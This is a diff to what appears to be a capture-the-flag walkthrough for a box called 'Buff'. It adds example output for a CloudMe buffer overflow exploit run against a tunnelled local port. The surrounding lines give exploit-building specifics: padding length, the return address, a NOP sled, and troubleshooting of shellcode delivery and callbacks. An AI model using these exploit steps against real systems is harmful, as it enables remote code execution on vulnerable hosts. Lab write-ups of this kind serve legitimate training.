@@ -58,6 +58,15 @@ python3 $BoxDir/exploits/buff_cloudme_48389_runner.py \
   127.0.0.1 8888 $BoxDir/exploits/buff_shellcode.bin
 ~~~
 
+## Example output
+
+    [*] Connecting to 127.0.0.1:8888
+    [*] Sending 1500-byte buffer
+    [*] Connection closed
+    CloudMe process restarted
+
+Focus on the exact 1500-byte send and the service restart. A restart is evidence that the overwrite path is active, but not evidence of code execution. If the process restarts without a callback, preserve the proven offset and gadget while checking x86 shellcode, bad characters, listener timing, and delivery path.
+
 If the service restarts but no callback arrives, keep the tested buffer and
 deliver it from the target's PHP process rather than a PowerShell wrapper. Build
 the 1052-byte padding, packed little-endian return address, 30-byte NOP sled,
